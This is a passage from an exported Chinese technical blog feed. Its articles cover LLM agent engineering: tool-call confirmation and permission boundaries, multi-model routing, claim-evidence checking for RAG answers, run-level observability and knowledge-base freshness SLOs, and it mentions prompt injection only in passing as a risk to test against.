<p>执行接口校验 token 与当前调用完全一致。用户确认“重跑 2023-10-26”后，模型不能把日期换成一个月；确认测试环境后，也不能复用 token 到生产。任何参数变化都重新预览和确认。</p>
<p>确认文本要来自确定性 plan，不由模型自由总结。模型可以解释，但 UI 的关键字段直接渲染结构化数据。否则模型漏掉“会覆盖分区”这类影响，用户的点击不能算知情确认。</p>
<p>低风险、可逆、无副作用查询可以免确认；风险等级由工具 owner 与安全策略确定，不让 Prompt 自己判断。频繁确认会让用户麻木，因此工具粒度和默认安全参数要先设计好。</p>
<h2 id="工具输出也在权限边界内"><a href="#工具输出也在权限边界内" class="headerlink" title="工具输出也在权限边界内"></a>工具输出也在权限边界内</h2><p>执行成功后返回的日志、对象详情和错误可能包含敏感信息。权限不是入口检查一次就结束。工具按 subject 过滤 result，模型只看到用户有权查看的字段。</p>
<p>错误码要避免对象枚举。无权访问与对象不存在可以对普通用户返回相同外部结果，原始原因只进安全审计。日志链接使用短期、绑定主体的访问凭证，不能返回一个所有人可打开的对象存储 URL。</p>
<p>Agent 的对话记忆也不能跨权限沿用。用户权限被撤销后，旧会话中曾检索的敏感片段不应继续进入下一轮。每次 run 构建上下文时按当前 policy version 复核引用，或让安全域变化直接关闭旧会话。</p>
<p>缓存 key 包含 subject scope 与 policy version。只按 tool name + arguments 缓存，会把管理员查询结果返回给普通用户。共享缓存只保存不含敏感数据的公开结果，并由工具明确声明。</p>
<h2 id="审计记录为什么允许，而不只记录做了什么"><a href="#审计记录为什么允许，而不只记录做了什么" class="headerlink" title="审计记录为什么允许，而不只记录做了什么"></a>审计记录为什么允许，而不只记录做了什么</h2><p>一次工具调用的审计要串起 user request、模型 proposal、resource resolution、policy input&#x2F;output、approval、tool execution 和 result。只有最终 API 日志，无法回答系统为何选择这个对象、谁的权限被使用、用户确认了哪份计划。</p>
<p>拒绝也进入统计。大量 OBJECT_AMBIGUOUS 说明命名&#x2F;检索需要改善；STATE_CONFLICT 说明预览到执行窗口太长；PERMISSION_DENIED 可能是用户越权，也可能是授权模型与组织流程不一致。把这些都叫模型失败，会修错方向。</p>
<p>安全回归集覆盖 Prompt 注入、伪造 user ID、越权对象 ID、确认后换参、旧 approval token、资源版本变化、工具直接绕过网关和结果字段泄露。每次策略、schema、模型或工具版本更新都重跑。</p>
<p>OpenAI 在 Function Calling 发布说明中已经提醒，来自不可信工具的数据可能诱导模型执行非预期动作，真实世界动作应增加用户确认。企业 Agent 还要再向下走一步：确认只能证明用户接受了计划，权限系统仍要证明他有权执行。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：工具输出注入风险与真实动作确认建议</a></li>
<li><a href="https://csrc.nist.gov/projects/role-based-access-control">NIST RBAC：基于角色的访问控制模型与标准背景</a></li>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-162/final">NIST SP 800-162：Attribute Based Access Control 定义与考虑</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html">OWASP Authorization Cheat Sheet：deny by default、每次请求校验权限</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 安全</tag>
        <tag>工具权限</tag>
        <tag>授权</tag>
      </tags>
  </entry>
  <entry>
    <title>多模型路由怎么做：先过能力硬约束，再比较成功率、延迟和成本</title>
    <url>//2023/11/04/multi-model-capability-routing/</url>
    <content><![CDATA[<p>多接几家模型后，网关很容易加一条“失败就切下一个”的逻辑。它能缓解单供应商不可用，却不是完整路由：备用模型可能不支持 function calling、上下文不够、数据地域不合规，或者虽然 HTTP 成功，业务输出已经无法使用。</p>
<p>我把路由分成两步。先用硬约束过滤出“有资格执行”的模型，再在候选中按具体任务的成功率、延迟和成本选择。fallback 也必须重新通过硬约束，不能为了可用性把安全与能力要求降掉。</p>
<p class="article-diagram-scroll"><img src="/images/articles/multi-model-capability-routing.svg" class="lazyload" data-srcset="/images/articles/multi-model-capability-routing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="多模型路由从请求约束出发"></p>
<span id="more"></span>

<h2 id="请求先声明不可妥协的约束"><a href="#请求先声明不可妥协的约束" class="headerlink" title="请求先声明不可妥协的约束"></a>请求先声明不可妥协的约束</h2><p>业务调用不只传一个 model alias，还应声明 capability requirements：是否需要 tools&#x2F;stream、最小 context、输入模态、结构化输出、数据所在区域、允许供应商、最大延迟和预算。</p>
<p>路由注册表按 provider + model snapshot 保存能力和状态。模型名里带 GPT、Chat 或 32k 不能作为推断依据；能力来自官方说明和探测。OpenAI 在 2023 年 6 月为特定 <code>0613</code> snapshot 引入 Function Calling，也说明通用别名会升级。网关需要记录固定版本是否支持工具，而不是把同一家所有模型视为等价。</p>
<p>硬过滤包括：功能支持、上下文容量、数据政策、区域、租户合同、健康度和版本状态。没有候选时返回 <code>NO_CAPABLE_MODEL</code> 并列出不含敏感信息的原因。悄悄截断上下文、删 tools 或跨区域发送，只会把明确失败变成隐蔽错误。</p>
<p>预算通常分软硬两类。单请求最大费用是硬约束；月度预算接近上限时，可以提高成本权重，但不能自动切到没有通过质量门槛的便宜模型。</p>
<h2 id="评分必须按任务桶建立"><a href="#评分必须按任务桶建立" class="headerlink" title="评分必须按任务桶建立"></a>评分必须按任务桶建立</h2><p>不存在一个模型在所有任务上都“最好”。摘要、代码解释、SQL 生成、工具选择、长文检索问答的质量和失败形态不同。全站用一个平均胜率做路由，会让高频简单问题淹没低频关键任务。</p>
<p>我按 task_type、语言、长度区间、是否有工具、风险等级建桶。每个 model snapshot 在桶内保存离线成功率、线上验证成功率、p50&#x2F;p95 latency、token cost、协议错误率和样本量。</p>
<p>评分不是只算一个静态公式。先设质量下限，再在达标候选中优化成本&#x2F;延迟。例如工具调用必须 schema-valid 与 policy-safe 达到阈值，之后才比较价格；不能用低一半成本抵消参数错误翻倍。</p>
<p>样本少时使用保守先验，避免新模型凭三次成功就拿走全部流量。先做影子评测和小流量探索，按固定用户&#x2F;会话分配，防止同一 Agent run 中途换模型破坏上下文一致性。</p>
<p>FrugalGPT 提出了用级联与路由组合不同 LLM API，在质量与成本间做选择。工程落地时，关键不是照搬某个优化算法，而是让成功标签来自真实任务验证，而不是另一个模型的泛化评分。</p>
<h2 id="“成功”要定义到业务结果"><a href="#“成功”要定义到业务结果" class="headerlink" title="“成功”要定义到业务结果"></a>“成功”要定义到业务结果</h2><p>HTTP 200、生成了文本、JSON 能解析，只是不同层级的成功。SQL 任务要经过目标引擎验证，工具任务要参数合法且执行结果确认，RAG 答案要有支持引用。路由反馈使用最接近业务的 verified outcome。</p>
<p>一次失败拆成 provider transport、gateway protocol、model output、tool&#x2F;engine validation、business result。供应商超时可以支持 fallback；模型输出语义错误可能换模型；用户权限拒绝则不该换十个模型重试。</p>
<p>成本统计包含失败与 fallback。主模型生成 90% 后断流，再用备用模型重跑，用户只看到一次答案，平台付了两次费用。只按最终模型计费会让路由器偏好一个经常失败但单价便宜的入口。</p>
<p>反馈有延迟。用户点赞即时，人工审核或任务真正成功可能几分钟后到达。用 request&#x2F;run ID 关联迟到标签，训练或调权时保留 label source 和时间，不能让粗糙的即时指标覆盖最终验证。</p>
<h2 id="Fallback-需要明确状态机"><a href="#Fallback-需要明确状态机" class="headerlink" title="Fallback 需要明确状态机"></a>Fallback 需要明确状态机</h2><p>什么失败可以自动 fallback，要按错误类型和请求幂等性定义。连接建立前的 503 可以换供应商；流式输出一半后断开，重新生成可能与已展示文本不同；工具已经执行后模型响应丢失，更不能从头跑一遍。</p>
<p>我会定义 route attempt：每次模型调用独立记录，外层 request 聚合。只有 <code>no_side_effect_committed=true</code> 且错误属于 retryable class 时，才能启动下一 attempt。新 attempt 默认拿相同输入 Bundle，变更模型由 route event 明确记录。</p>
<p>fallback 链长度有限，受总 deadline 和总成本约束。三个模型依次等 30 秒不叫高可用。首选失败后若剩余时间不足，直接返回可重试错误，或使用已验证的降级模板。</p>
<p>结构化工具调用不能 fallback 到只会文本的模型。允许降级时，协议明确 <code>degraded_mode</code>，例如只能回答说明、不能执行动作。UI 不把降级文本继续渲染成“已处理”。</p>
<h2 id="路由策略也要版本和回放"><a href="#路由策略也要版本和回放" class="headerlink" title="路由策略也要版本和回放"></a>路由策略也要版本和回放</h2><p>一次请求记录 route_policy_version、候选列表、过滤原因、各项分数、最终模型 snapshot 和 fallback events。发生质量问题时，能解释为什么当时选了它，而不是只看到一个供应商名。</p>
<p>策略更新先对历史请求离线回放，比较如果使用新权重会选谁，再对可复现样本真实调用。离线预测只用于筛选，最终还需 shadow&#x2F;canary 验证，因为模型供应状态和延迟会变化。</p>
<p>健康度不是全局布尔值。某区域超时、某模型流式协议异常、某租户配额耗尽，需要按 provider&#x2F;model&#x2F;region&#x2F;credential pool 细分。断路器状态进入 route reason，恢复时小流量探测，不瞬间把全部流量切回。</p>
<p>路由目标也不能在运行中偷偷变化。成本策略、质量门槛和供应商合同变更都发布新 policy version。这样月度成本下降时，能区分是模型价格、请求结构还是路由策略造成。</p>
<p>多模型网关最终要回答的不是“我们接了多少模型”，而是每类任务在什么约束下由哪个版本完成，失败时为什么换、换完是否仍满足原要求。先守硬边界，再优化质量、延迟和成本，路由才是工程能力，不是随机负载均衡。</p>
<h2 id="参考论文与官方资料"><a href="#参考论文与官方资料" class="headerlink" title="参考论文与官方资料"></a>参考论文与官方资料</h2><ul>
<li><a href="https://arxiv.org/abs/2305.05176">FrugalGPT：通过 LLM cascade 与 routing 优化质量和成本</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023-06-13 API 更新：Function Calling 能力与固定模型版本</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP 错误、Retry-After 与方法语义</a></li>
<li><a href="https://github.com/openai/evals">OpenAI Evals：用任务用例评估不同模型行为</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>成本治理</tag>
        <tag>模型网关</tag>
        <tag>模型路由</tag>
      </tags>
  </entry>
  <entry>
    <title>模型答案为什么要多一层 Evidence：有引用不等于结论被支持</title>
    <url>//2023/12/14/model-answer-evidence-layer/</url>
    <content><![CDATA[<p>RAG 产品加上“参考资料”区域后，答案看起来会可信很多。实际抽查时经常发现：链接确实相关，却没有支持模型写出的数字；文档说的是测试环境，答案扩展到了生产；三条引用里两条互相冲突，模型选了表达最顺的一条。</p>
<p>引用是展示形式，证据关系才是可验证结构。我会在最终答案前增加 Evidence 层：先拆出可核查 claim，再把每个 claim 与具体 source&#x2F;version&#x2F;span 对齐，标注支持、冲突或不足，最后由发布策略决定保留、降级措辞或拒答。</p>
<p class="article-diagram-scroll"><img src="/images/articles/model-answer-evidence-layer.svg" class="lazyload" data-srcset="/images/articles/model-answer-evidence-layer.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="答案层之外增加 Claim-Evidence 层"></p>
<span id="more"></span>

<h2 id="先定义哪些句子是-Claim"><a href="#先定义哪些句子是-Claim" class="headerlink" title="先定义哪些句子是 Claim"></a>先定义哪些句子是 Claim</h2><p>不是每个连接词都需要引用。对象身份、数值、日期、规则、状态、因果和操作建议属于需要核查的 claim；“下面给出三点”这类组织语言不用。</p>
<p>一段答案可能包含多个 claim：“订单表由交易团队负责，每天 2 点更新，失败会自动重试 3 次。”owner、schedule 和 retry 分别来自不同元数据。只在段尾放一个链接，会让读者误以为同一来源支持全部结论。</p>
<p>我让生成模型先输出结构化草稿，或在生成后用 parser 拆 claim：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;claim_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;subject&quot;</span><span class="punctuation">:</span> <span class="string">&quot;job_123&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;predicate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;retry_limit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;qualifiers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结构不是为了把所有语言变成知识图谱，而是抓住可比较的事实。最终自然语言仍可灵活，但关键值、对象与限定条件不能在润色时变化。</p>
<h2 id="Evidence-必须定位到版本与-Span"><a href="#Evidence-必须定位到版本与-Span" class="headerlink" title="Evidence 必须定位到版本与 Span"></a>Evidence 必须定位到版本与 Span</h2><p>证据引用 source ID、document&#x2F;entity version、section&#x2F;span、有效时间和访问策略。只保存 URL 不够，网页或文档更新后，同一链接内容已经变化；只保存 chunk ID 也不够，重新切块会让 ID 失效。</p>
<p>span 可以用字符位置、结构路径和内容 hash 组合定位。答案页面展示标题与片段，点击回源时重新鉴权。审计保留当时证据快照或合规范围内的 hash，避免以后无法解释。</p>
<p>KILT 把知识密集型任务的答案与 provenance 一起评估，这个思路适合企业 RAG：答案正确但来源错，仍是失败。内部系统还需加版本、权限和有效期，确保“来源存在”与“当时可作为依据”同时成立。</p>
<p>Evidence 只能来自本次实际进入模型上下文或确定性工具结果。事后搜索一条看起来相关的文档贴在答案后面，是伪引用。trace 中要能证明哪个 span 在哪个步骤被提供给模型。</p>
<h2 id="支持关系需要逐项检查"><a href="#支持关系需要逐项检查" class="headerlink" title="支持关系需要逐项检查"></a>支持关系需要逐项检查</h2><p>文本相似度不能直接判定 supports。证据写“最大并发默认 20”，claim 写“所有任务最大并发不能超过 20”，多了“所有”和“不能超过”，语义已经变成硬上限。</p>
<p>对结构化元数据，优先做确定性对齐：subject ID、predicate、value、unit、environment 和 valid time 一致。对文档文本，可用规则与模型评审组合，但评审输出必须引用具体 span，并允许 <code>insufficient</code>，不能强制二选一。</p>
<p>数值要检查单位和聚合。<code>30 days</code> 不能只因出现 30 就支持“30 次”；报表总量不能支持某个部门的细分值。时间也要检查，历史制度不支持当前状态，除非 claim 明确说的是历史。</p>
<p>支持不等于完整。证据可能支持主结论，却缺适用条件。claim 的 qualifiers 与证据范围逐项比较，缺项就标 partial&#x2F;insufficient，发布时把限定补回或降低确定性。</p>
<h2 id="冲突由规则处理，不让模型投票"><a href="#冲突由规则处理，不让模型投票" class="headerlink" title="冲突由规则处理，不让模型投票"></a>冲突由规则处理，不让模型投票</h2><p>同一 claim 可能有多个 evidence。正式制度与群聊记录冲突，新旧版本冲突，Catalog owner 与组织系统冲突。相似度、出现次数或上下文顺序都不是权威规则。</p>
<p>证据源注册 authority level、owner、validity 和 conflict policy。例如当前认证指标定义高于未认证 Wiki；组织系统是 owner 的权威源；两个同级正式制度冲突则不自动回答，生成治理告警。</p>
<p>模型可以把冲突解释给用户：“制度 v2 写 30 天，运维手册仍写 7 天，当前无法确认。”它不能悄悄选一个，也不能把两个数字平均。冲突本身是需要被保留的事实。</p>
<p>过期来源不是立即删除。历史问答可能需要旧证据，但当前问题默认过滤无效版本。query time intent、source valid time 与 claim time 三者要对齐。</p>
<h2 id="发布策略决定答案能说到什么程度"><a href="#发布策略决定答案能说到什么程度" class="headerlink" title="发布策略决定答案能说到什么程度"></a>发布策略决定答案能说到什么程度</h2><p>每个 claim 得到 <code>supported</code>、<code>partial</code>、<code>contradicted</code>、<code>insufficient</code>。低风险说明类问题可以删除 unsupported 句子后返回；关键指标、生产操作和权限类问题只要核心 claim 不被支持，就拒答或转人工。</p>
<p>策略可以把确定语气降级：“当前索引中只找到测试环境配置，生产值无法确认。”这不是简单让模型“更谨慎”，而是根据 evidence status 生成固定边界。</p>
<p>最终 UI 把引用放在对应 claim 旁，展示来源名称、版本和更新时间。一个段落多个来源时，用户不用在页脚猜哪个链接支持哪句话。机器接口同时返回 claim&#x2F;evidence IDs，方便下游系统继续验证。</p>
<p>回答保存 finalization report：删除了哪些 unsupported claims、发现哪些冲突、用了哪个 policy version。只保存最终文本，会看不到系统实际上挡住了多少风险。</p>
<h2 id="评测围绕-Claim-Evidence-对"><a href="#评测围绕-Claim-Evidence-对" class="headerlink" title="评测围绕 Claim-Evidence 对"></a>评测围绕 Claim-Evidence 对</h2><p>评测样本标注 expected claims、supporting spans、forbidden claims 和冲突处理。指标包括 claim precision&#x2F;recall、evidence precision&#x2F;recall、citation support rate、unsupported claim rate 和正确拒答率。</p>
<p>长答案不能因为多数普通句子正确，就掩盖一个错误关键数字。claim 按风险加权，生产操作建议、权限和财务数字权重更高。unsupported high-risk claim 是守门失败，不参与平均稀释。</p>
<p>线上用户点“引用不支持”时，直接落到 claim&#x2F;evidence pair。人工修复可能更新知识源、调整 chunk、修改对齐器或改变发布策略，不再把所有问题扔给 Prompt 团队。</p>
<p>Evidence 层会增加一点延迟和实现成本，但它把“看起来有来源”变成“结论与来源有可检查关系”。在数据平台和企业 Agent 场景里，这层结构决定答案能否进入真实决策，而不仅是用于聊天参考。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2009.02252">KILT：答案与知识来源 provenance 的联合基准</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：外部检索证据进入生成上下文</a></li>
<li><a href="https://arxiv.org/abs/1803.05355">FEVER：对文本 claim 做 evidence retrieval 与 verification</a></li>
<li><a href="https://arxiv.org/abs/2104.08663">BEIR：跨领域检索的统一评测框架</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>RAG</tag>
        <tag>证据链</tag>
        <tag>可信回答</tag>
      </tags>
  </entry>
  <entry>
    <title>LLM 应用怎么做可观测：不要把一次 HTTP 请求当成一次 Run</title>
    <url>//2024/01/04/llm-run-observability/</url>
    <content><![CDATA[<p>传统 API 监控里，一条 HTTP 请求通常对应一个服务操作。LLM 应用不一样：用户问一句话，内部可能先检索两次、调用主模型、执行工具、再调用模型总结；上游断流后还可能换模型重试。只记录入口 latency 和 status&#x3D;200，看不出回答为何错，也算不清真实成本。</p>
<p>我把 <code>run</code> 定义成一次用户意图的完整处理，下面挂 retrieval、model attempt、tool call、policy decision 和 finalization。HTTP request 是承载方式之一，不是业务身份。所有事件通过 run_id 串起来，最终状态由证据归并得出。</p>
<p class="article-diagram-scroll"><img src="/images/articles/llm-run-observability.svg" class="lazyload" data-srcset="/images/articles/llm-run-observability.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="一次 LLM Run 的证据树"></p>
<span id="more"></span>

<h2 id="Run、Attempt-和-Span-分工不同"><a href="#Run、Attempt-和-Span-分工不同" class="headerlink" title="Run、Attempt 和 Span 分工不同"></a>Run、Attempt 和 Span 分工不同</h2><p>Run 表示用户看到的一次操作。模型 429 后重试两次，仍属于一个 Run，但有三个 model attempts；工具查询和最终总结分别是 spans。把重试当新 Run，会夸大用户请求量，也丢失失败成本。</p>
<p>每个 Run 固定 user&#x2F;session、tenant、input hash、Bundle version、deadline 与风险等级。Attempt 固定 provider、model snapshot、route reason、request ID、start&#x2F;end 和 outcome。Span 记录一个具体阶段的父子关系与事件。</p>
<p>W3C Trace Context 定义了跨服务传播 <code>traceparent</code>&#x2F;<code>tracestate</code> 的基础，OpenTelemetry Trace 也用 trace、span 与 events 表示分布式操作。LLM 平台可以沿用这套关联，但需增加业务 run_id：一个 Run 可能跨多个异步 trace，trace 采样也不能让业务审计身份消失。</p>
<p>调用外部模型或工具时传递可接受的 trace header；供应商不支持时，保存其 request ID 与本地 span ID 映射。日志里只有各自 UUID、没有关联表，等同于没有链路。</p>
<h2 id="时间至少分发生与观测"><a href="#时间至少分发生与观测" class="headerlink" title="时间至少分发生与观测"></a>时间至少分发生与观测</h2><p>流式事件在供应商生成、网关接收、客户端展示之间有延迟。工具执行结果也可能通过异步回调晚到。只保存一个 timestamp，无法分析慢在哪里，也无法处理乱序。</p>
<p>事件至少包含 <code>event_time</code>（源端声称发生）、<code>observed_at</code>（本系统收到）、<code>sequence</code>（同一来源顺序）和 monotonic duration。跨机器 wall clock 会漂移，单进程耗时优先使用单调时钟；跨服务只在时钟同步误差范围内解释。</p>
<p>首 token latency 从上游请求发送到首个有效模型 delta，不包括网关排队时可再拆 queue duration。最终 answer latency 从 Run 开始到可交付终态。客户端断开后上游仍运行时，provider latency 与 user-perceived latency 分开。</p>
<p>所有 duration 附起止事件，而不是直接打一个数。将来修复事件解析器后，可以从原始时间重新计算；只存聚合值无法回放。</p>
<h2 id="状态要表达不完整与待动作"><a href="#状态要表达不完整与待动作" class="headerlink" title="状态要表达不完整与待动作"></a>状态要表达不完整与待动作</h2><p>HTTP 200 不能直接写 success。一个模型 attempt 可能 completed、truncated、blocked、incomplete、cancelled 或 failed；工具调用可能 proposed、authorized、running、succeeded、business-verified；Run 还可能 requires_action 等用户确认。</p>
<p>最终化规则必须确定。例如文本正常结束但引用校验失败，model attempt 是 completed，Run 是 failed_validation；工具已成功但总结模型断流，operation 是 succeeded，Run 是 incomplete，重试时不能再执行工具。</p>
<p>状态转换记录 actor 与 evidence reference。人工把 Run 标成 resolved，不覆盖原失败事件，而是追加 resolution。这样“用户最终拿到答案”和“第一次执行成功”可以同时统计。</p>
<p>告警按层级分开：provider transport error、adapter protocol error、invalid model output、tool&#x2F;policy error、answer validation failure。一个总 error rate 无法指向责任模块。</p>
<h2 id="成本要覆盖失败路径"><a href="#成本要覆盖失败路径" class="headerlink" title="成本要覆盖失败路径"></a>成本要覆盖失败路径</h2><p>一次成功答案可能包含检索、重排、两个模型 attempt、embedding 与工具 API。成本账本按 span 记录 input&#x2F;output tokens、供应商报告 usage、估算标志、单价版本和缓存命中。</p>
<p>失败 attempt 不能丢。主模型输出一半后断流，fallback 再完整生成，用户只见一次答案，平台支付两份 token。若报表只算最终成功 attempt，会让不稳定路由看起来又便宜又快。</p>
<p>token usage 允许缺失。流式中途断开时供应商可能没有最终 usage，平台可以按 tokenizer&#x2F;字符估算，但字段标 <code>estimated=true</code>。估算不能覆盖原生值，也不能用于供应商账单对账。</p>
<p>成本与质量通过 Run 关联，才能看每个“验证成功答案”的价格。只看每千 token 单价，会忽略某个便宜模型反复重试、工具参数错误导致的额外成本。</p>
<h2 id="内容观测要按风险分层"><a href="#内容观测要按风险分层" class="headerlink" title="内容观测要按风险分层"></a>内容观测要按风险分层</h2><p>完整 Prompt、检索片段、工具参数和答案最利于复现，也可能包含个人信息、商业数据和凭据。不能因为要可观测就默认全部明文落日志。</p>
<p>schema 层标记敏感字段，写入前做结构化脱敏；正文可以保存加密 payload、hash 和保留期。普通值班人员看到事件结构、长度、错误和对象 ID，只有经过授权的调查才能解密内容。</p>
<p>采样也要分层。性能 metrics 可以全量，结构化事件尽量全量，正文 payload 按风险与错误采样。安全、权限与真实动作审计不能被普通 trace sampling 丢掉，另走不可变审计存储。</p>
<p>用户删除会话后，内容与派生 embedding 的删除范围要清楚；运营统计保留匿名聚合，不继续保存可还原原文的 hash&#x2F;metadata 组合。</p>
<h2 id="可复现依赖完整版本上下文"><a href="#可复现依赖完整版本上下文" class="headerlink" title="可复现依赖完整版本上下文"></a>可复现依赖完整版本上下文</h2><p>排查“昨天能答、今天答错”，至少要知道 model snapshot、Prompt Bundle、tool schemas、retrieval&#x2F;index、policy 和 adapter 版本。只记录模型名没有意义，通用别名和知识库都可能变化。</p>
<p>我会从失败 Run 生成 replay manifest，引用去敏输入、固定检索证据、模拟工具结果和预期不变量。离线先重放 normalization&#x2F;finalization；确需真实模型再发新 attempt，并明确它不是对历史现场的完全复现。</p>
<p>Dashboard 只是证据的入口。点开错误率，应能到 Run，再到具体 attempt&#x2F;span、原生事件和验证结论。反过来，从一条供应商 request ID 也能找到用户 Run 与最终影响。</p>
<p>LLM 可观测的目标不是多打几条 Prompt 日志，而是把一次复杂运行拆成有身份、有版本、有状态的证据树。这样才能区分模型、检索、工具和协议问题，解释成本，也能在改完之后用同一份失败现场做回归。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨服务传播 trace 标识的标准</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span、Event、Link 与状态模型</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：模型与工具交互的公开协议背景</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP 成功与错误状态的协议语义</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>模型网关</tag>
        <tag>LLM 可观测性</tag>
        <tag>Trace</tag>
      </tags>
  </entry>
  <entry>
    <title>知识库的新鲜度怎么量：从源变更到回答可见的延迟预算</title>
    <url>//2024/03/05/knowledge-freshness-sla/</url>
    <content><![CDATA[<p>知识库页面显示“今天更新”，不代表用户现在问问题能检索到今天的内容。源文档变更后，要经过事件发现、抓取、解析、embedding、索引发布、复制与缓存失效。任何一段积压，答案都可能继续引用旧版本。</p>
<p>我把新鲜度定义为 <code>query-visible time - source event time</code>，再拆成各阶段延迟预算。没有源事件时间时，只能报告“平台最近一次成功观测”，不能把抓取时间冒充内容真实更新时间。</p>
<p class="article-diagram-scroll"><img src="/images/articles/knowledge-freshness-sla.svg" class="lazyload" data-srcset="/images/articles/knowledge-freshness-sla.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="知识新鲜度预算拆解"></p>
<span id="more"></span>

<h2 id="先区分四种时间"><a href="#先区分四种时间" class="headerlink" title="先区分四种时间"></a>先区分四种时间</h2><p><code>source_event_time</code> 是源系统中内容或权限真正生效的时间；<code>discovered_at</code> 是 connector 发现变更；<code>indexed_at</code> 是新版本进入检索索引；<code>served_at</code> 是线上查询第一次能命中新版本。</p>
<p>只监控 ingestion job duration，看到每次五分钟完成，也可能漏掉事件在队列里等了两小时。只看 indexed_at 又会漏掉 alias 未切、只读副本延迟和 answer cache 仍返回旧内容。</p>
<p>每个版本保存这些时间与时区，duration 用统一 UTC 计算。源系统只给日期没有时刻时，精度标为 day，不拿 00:00:00 计算一个虚假的小时级 SLA。</p>
<p><code>observed_at - event_time</code> 可能为负，通常是时钟漂移或源事件使用业务有效时间。系统要保留原值并标异常，不能简单取绝对值。跨系统时钟误差进入误差预算。</p>
<h2 id="Watermark-表达“处理到哪里”"><a href="#Watermark-表达“处理到哪里”" class="headerlink" title="Watermark 表达“处理到哪里”"></a>Watermark 表达“处理到哪里”</h2><p>最新成功一条事件不能证明之前没有缺口。connector 应维护 source partition&#x2F;tenant 维度的 watermark：所有小于等于该位置的事件已成功处理或明确隔离。遇到坏文档时，是阻塞 watermark，还是记录 dead-letter 后推进，要由内容风险决定。</p>
<p>高风险权限事件优先且不可跳过。普通文档解析失败可以隔离并推进，同时在 coverage 指标扣分；权限撤销失败则 fail closed，避免新鲜度提高却留下泄露。</p>
<p>全量扫描型源没有事件 offset，可以使用 enumeration snapshot：本轮列出了多少 source IDs、开始&#x2F;结束时间、与上轮差异。扫描成功但只拿到半页分页数据，不应推进 watermark。分页 token、总数和校验要入 manifest。</p>
<p>查询时将所需知识域的 watermark&#x2F;freshness 带入 trace。用户问的是财务制度，技术文档源的延迟不影响本次答案；全局一个“知识库延迟”会混淆不同域。</p>
<h2 id="SLO-要按内容风险分级"><a href="#SLO-要按内容风险分级" class="headerlink" title="SLO 要按内容风险分级"></a>SLO 要按内容风险分级</h2><p>不是所有知识都需要分钟级同步。产品介绍一天更新一次可能够用，生产权限撤销应在几分钟内生效，任务运行状态甚至需要秒级。统一把所有内容做实时，会增加复杂度和成本，也无法表达业务优先级。</p>
<p>我为每个 source class 定义 freshness objective 与 stale action：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">权限/密级：P99 5 分钟；超时后 fail closed</span><br><span class="line">生产运行状态：P95 1 分钟；显示观测时间，超时拒绝确定结论</span><br><span class="line">制度与配置：P95 30 分钟；标 stale，可回源确认</span><br><span class="line">历史知识：P95 24 小时；允许旧版本服务</span><br></pre></td></tr></table></figure>

<p>SLO 统计从 source event 到 served，按版本而不是按任务次数。一天没有变更时不能用“无失败”制造 100% 新鲜度；通过周期性 synthetic updates 或源端 heartbeat 验证链路仍工作。</p>
<p>Google SRE 对 SLI&#x2F;SLO 的基本原则是从用户可见行为定义指标。知识系统也一样：索引任务绿灯只是内部信号，用户能否看到正确版本才是最终 SLI。</p>
<h2 id="Cache-是最容易漏掉的一段"><a href="#Cache-是最容易漏掉的一段" class="headerlink" title="Cache 是最容易漏掉的一段"></a>Cache 是最容易漏掉的一段</h2><p>向量索引已更新，query&#x2F;result cache 仍可能返回旧候选；answer cache 更直接保存带旧引用的完整回答。缓存 key 只包含问题文本时，内容版本、权限和时间都无法失效。</p>
